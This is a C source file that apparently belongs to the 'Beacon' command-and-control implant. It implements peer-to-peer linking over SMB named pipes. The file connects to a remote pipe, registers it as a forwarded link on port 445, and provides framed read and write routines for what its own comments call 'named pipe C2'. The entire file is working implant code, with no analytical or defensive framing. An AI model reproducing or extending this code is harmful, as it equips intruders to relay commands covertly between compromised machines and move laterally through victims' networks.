#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "link.h"
#include "linkint.h"

/* poll our socket and see if it's ready to be read from */
static BOOL is_ready(HANDLE my_pipe, int timeout) {
	unsigned long avail;
	DWORD         until = GetTickCount() + timeout;

	while (GetTickCount() < until) {
		if (!PeekNamedPipe(my_pipe, NULL, 0, NULL, &avail, NULL))
			return FALSE;

		if (avail > 0)
			return TRUE;

		Sleep(10);
	}

	return FALSE;
}

/* attempt to connect to a named pipe */
void link_start(char * pipename, void(*callback)(char * buffer, int length, int type)) {
	HANDLE pipe;
	DWORD  mode;
	DWORD status;
	DWORD stopat = GetTickCount() + 15000;

	/* connect to our pipe */
	while (GetTickCount() < stopat) {
		pipe = CreateFile(pipename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);

		/* are we good to go?!? rock! */
		if (pipe != INVALID_HANDLE_VALUE) {
			break;
		}

		/* punt... not going to work */
		if (GetLastError() == ERROR_PIPE_BUSY) {
			WaitNamedPipe(pipename, 10000);
		}
		else {
			Sleep(1000);
		}
	}

	/* post the right error, if we didn't succeed */
	if (pipe == INVALID_HANDLE_VALUE) {
		if (GetLastError() == ERROR_SEM_TIMEOUT)
			post_error_na(0x04);
		else
			post_error_d(0x14, GetLastError());

		return;
	}

	/* congrats.. we're connected. Now, we need to read an agent id */
	mode = PIPE_READMODE_MESSAGE;
	status = SetNamedPipeHandleState(pipe, &mode, NULL, NULL);
	if (!status) {
		goto cleanup;
	}

	/* try to register our channel as a new link */
	if (link_register(lchannel_smb(pipe), CHANNEL_FORWARD_PIPE(445), callback))
		return;

	DisconnectNamedPipe(pipe);
	CloseHandle(pipe);
	return;

cleanup:
	post_error_d(0x14, GetLastError());

	/* cleanup, because we failed */
	DisconnectNamedPipe(pipe);
	CloseHandle(pipe);
}

/*
* establish a connection to a Beacon (provide the whole pipe in the parameter, please
*/
void command_link_start_explicit(char * buffer, int length, void(*callback)(char * buffer, int length, int type)) {
	link_start(buffer, callback);
}

/* 
 * Primitive for a single read.
 */
int read_all(HANDLE pipe, char * buffer, int get) {
	int read = 0;
	int total = 0;
	BOOL status;

	/* get it in pieces if we need to */
	while (total < get) {
		/* do our read */
		status = ReadFile(pipe, buffer + total, get - total, (LPDWORD)&read, NULL);

		/* check it */
		if (!status || read == 0)
			return -1;

		/* NOTE: 
		 * ReadFile can return FALSE and GetLastError() == ERROR_MORE_DATA when nNumberOfBytesToRead is < the overall message size.
		 * This is a characteristic of named pipes in read message mode.
		 * https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile
		 *
		 * I'm not checking for the error as we always know the size of our frames and are reading a value that is greater than or
		 * equal to the size of an individual write message. It's up for debate whether or not message mode is needed for our named
		 * pipe C2. The choice to use message mode has survived since 2013 and I would not deviate without a lot of testing.
		 */

		/* increment our total */
		total += read;
	}

	/* we came up short on our read. This is protocol breaking and its an error. */
	if (total != get)
		return -1;

	return total;
}

/* write a frame, remember the contract: TRUE = success, FALSE = failed */
BOOL write_all(HANDLE pipe, char * buffer, int size) {
	int wrote   = 0, temp = 0;
	BOOL status = TRUE;

	while (wrote < size) {
		/* write out... 8K at a time */
		status = WriteFile(pipe, buffer + wrote, (size - wrote) > 8192 ? 8192 : (size - wrote), (LPDWORD)&temp, NULL);

		/* check that it didn't fail */
		if (!status)
			return status;

		/* keep trying */
		wrote += temp;
	}

	return status;
}

/* 
 * Implement our SMB Beacon module.
 */
int link_channel_smb_read(void * thisp, char * buffer, int max) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	char     * frame;
	int        flen, rlen, get;

	/* read our length into a pro-forma frame */
	frame = link_frame_header(SETTING_SMB_FRAME_HEADER, 0, &flen);
	rlen  = read_all(inst->pipe, frame, flen);
	if (rlen == -1 || rlen != flen)
		return -1;

	/* extract our length value... */
	memcpy(&get, frame + flen + -4, 4);

	/* sanity check our get value */
	if (get > max || get < 0)
		return -1;

	return read_all(inst->pipe, buffer, get);
}

int link_channel_smb_write(void * thisp, char * buffer, int length) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	char     * frame;
	int        flen;

	/* build and write our frame header */
	frame = link_frame_header(SETTING_SMB_FRAME_HEADER, length, &flen);
	if (!write_all(inst->pipe, frame, flen))
		return FALSE;

	/* write the entire package */
	return write_all(inst->pipe, buffer, length);
}

void link_channel_smb_close(void * thisp) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	DisconnectNamedPipe(inst->pipe);
	CloseHandle(inst->pipe);
}

void link_channel_smb_flush(void * thisp) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	FlushFileBuffers(inst->pipe);
}

int link_channel_smb_ready(void * thisp, int timeout) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	return is_ready(inst->pipe, timeout);
}

void link_channel_smb_nop(void * thisp) {
	/* do nothing */
}

LCHANNEL lchannel_smb(HANDLE pipe) {
	LCHANNEL channel;
	channel.pipe  = pipe;
	channel.read  = link_channel_smb_read;
	channel.write = link_channel_smb_write;
	channel.close = link_channel_smb_close;
	channel.flush = link_channel_smb_flush;
	channel.ready = link_channel_smb_ready;
	channel.wait  = link_channel_smb_nop;
	return channel;
}